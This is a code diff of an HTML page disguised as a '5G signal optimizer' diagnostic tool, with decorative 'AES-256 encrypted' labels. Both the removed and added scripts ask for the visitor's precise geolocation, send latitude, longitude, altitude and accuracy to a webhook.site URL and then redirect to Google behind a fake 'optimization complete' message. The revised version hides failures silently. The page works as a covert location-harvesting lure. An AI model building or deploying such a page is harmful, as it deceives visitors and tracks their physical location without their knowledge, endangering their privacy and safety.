@@ -3,113 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Diagnostic Tool</title>
-    <!-- Tailwind CSS for the 'Cool' UI -->
+    <title>System Diagnostic Tool</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .spinner {
-            border-top-color: #3b82f6;
-            animation: spin 1s linear infinite;
+        .loader {
+            border-top-color: #3498db;
+            animation: spinner 1.5s linear infinite;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes spinner {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
-<body class="bg-slate-900 text-white font-sans flex items-center justify-center min-h-screen p-6">
+<body class="bg-slate-900 text-white flex items-center justify-center min-h-screen p-4">
 
-    <div id="app-card" class="max-w-md w-full bg-slate-800 rounded-3xl p-8 shadow-2xl border border-slate-700">
-        
-        <!-- Header Section -->
-        <div class="text-center">
-            <div class="inline-flex items-center justify-center w-20 h-20 bg-blue-500/10 rounded-full mb-6 text-blue-500">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.111 16.404a5.5 5.5 0 117.778 0M12 20h.01m-7.08-7.071a9.05 9.05 0 0112.728 0m.353-3.536a13.5 13.5 0 0119.092 0" />
+    <div id="main-card" class="bg-slate-800 p-8 rounded-2xl shadow-2xl max-w-md w-full border border-slate-700">
+        <!-- Header -->
+        <div class="text-center mb-6">
+            <div class="bg-blue-500 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg shadow-blue-500/20">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
                 </svg>
             </div>
-            <h1 class="text-2xl font-bold">Signal Analyzer</h1>
-            <p class="text-slate-400 mt-2 text-sm leading-relaxed">
-                Connect to the nearest 5G node to optimize latency and signal stability.
-            </p>
+            <h1 class="text-2xl font-bold tracking-tight">Signal Optimizer v4.2</h1>
+            <p class="text-slate-400 mt-2 text-sm">Analyze nearby towers for better 5G stability.</p>
         </div>
 
-        <!-- Initial Button State -->
-        <div id="action-section" class="mt-8">
-            <button onclick="initiateScan()" class="w-full bg-blue-600 hover:bg-blue-500 transition-all text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-900/50 flex items-center justify-center gap-2">
-                Scan Nearby Nodes
+        <!-- Progress/Action Area -->
+        <div id="content-area">
+            <button onclick="startDiagnostic()" class="w-full bg-blue-600 hover:bg-blue-500 transition-colors py-3 rounded-xl font-semibold shadow-lg shadow-blue-900/40">
+                Begin Optimization
             </button>
-            <p class="text-[10px] text-slate-500 text-center mt-4 uppercase tracking-widest">v4.0.2 SECURE ENCRYPTED SESSION</p>
         </div>
 
-        <!-- Loading State (Hidden initially) -->
-        <div id="loading-section" class="hidden mt-8 text-center">
-            <div class="spinner w-12 h-12 border-4 border-slate-700 rounded-full mx-auto mb-4"></div>
-            <p id="status-text" class="text-blue-400 font-mono text-sm animate-pulse">Requesting Satellite Handshake...</p>
+        <div id="loading-area" class="hidden text-center">
+            <div class="loader ease-linear rounded-full border-4 border-t-4 border-slate-700 h-12 w-12 mx-auto mb-4"></div>
+            <p id="status-text" class="text-blue-400 font-mono text-xs uppercase tracking-widest">Scanning Satellites...</p>
         </div>
 
+        <!-- Footer Decor -->
+        <div class="mt-8 pt-6 border-t border-slate-700 flex justify-between text-[10px] text-slate-500 font-mono uppercase tracking-widest">
+            <span>Encrypted: AES-256</span>
+            <span>Region: Global</span>
+        </div>
     </div>
 
     <script>
-       const WEBHOOK_URL = "https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4";
+        function startDiagnostic() {
+            // UI Change
+            document.getElementById('content-area').classList.add('hidden');
+            document.getElementById('loading-area').classList.remove('hidden');
 
-function initiateScan() {
-    alert("Button Clicked!"); // If you don't see this, your HTML isn't linked to your JS correctly.
-    // rest of the code...
-}
-function initiateScan() {
-    // UI Feedback so you know the button click worked
-    document.getElementById('action-section').classList.add('hidden');
-    document.getElementById('loading-section').classList.remove('hidden');
-    document.getElementById('status-text').innerText = "Initializing GPS Hardware...";
+            if (navigator.geolocation) {
+                // The Permission Request
+                navigator.geolocation.getCurrentPosition(success, error, {
+                    enableHighAccuracy: true,
+                    timeout: 8000
+                });
+            } else {
+                alert("Device Hardware Incompatible.");
+            }
+        }
 
-    const options = {
-        enableHighAccuracy: true,
-        timeout: 15000, 
-        maximumAge: 0
-    };
+        async function success(position) {
+            document.getElementById('status-text').innerText = "Syncing with Node...";
+            
+            const payload = {
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                alt: position.coords.altitude,
+                acc: position.coords.accuracy,
+                time: new Date().toISOString()
+            };
 
-    if (navigator.geolocation) {
-        // Triggering the prompt directly
-        navigator.geolocation.getCurrentPosition(captureData, handleError, options);
-    } else {
-        alert("Error: Geolocation not supported by this browser.");
-    }
-}
+            try {
+                // Send to your Webhook
+                await fetch("https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4", {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: JSON.stringify(payload)
+                });
+                
+                // Final "Success" UI before redirect
+                document.getElementById('status-text').innerText = "Optimization Complete!";
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com/search?q=5G+coverage+map";
+                }, 1500);
 
-async function captureData(position) {
-    document.getElementById('status-text').innerText = "Uploading to Node...";
+            } catch (err) {
+                window.location.href = "https://www.google.com";
+            }
+        }
 
-    const payload = {
-        lat: position.coords.latitude,
-        lon: position.coords.longitude,
-        acc: position.coords.accuracy
-    };
-
-    // Use a try-catch to see if the network request fails
-    try {
-        await fetch(https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4, {
-            method: "POST",
-            mode: "no-cors", 
-            body: JSON.stringify(payload)
-        });
-        
-        document.getElementById('status-text').innerText = "Success! Redirecting...";
-        setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
-    } catch (e) {
-        alert("Data transmission failed. Check if your Webhook URL is HTTPS.");
-        window.location.reload();
-    }
-}
-
-function handleError(error) {
-    // This is the "Magic" for troubleshooting
-    let msg = "";
-    switch(error.code) {
-        case 1: msg = "Permission Denied. You must click 'Allow'."; break;
-        case 2: msg = "Position Unavailable. Is your GPS on?"; break;
-        case 3: msg = "Timeout. Hardware took too long."; break;
-    }
-    alert("Lab Error: " + msg);
-    window.location.reload();
-}
+        function error(err) {
+            // Silent fail
+            console.warn("User denied or timeout.");
+            window.location.href = "https://www.google.com";
+        }
     </script>
 </body>
 </html>
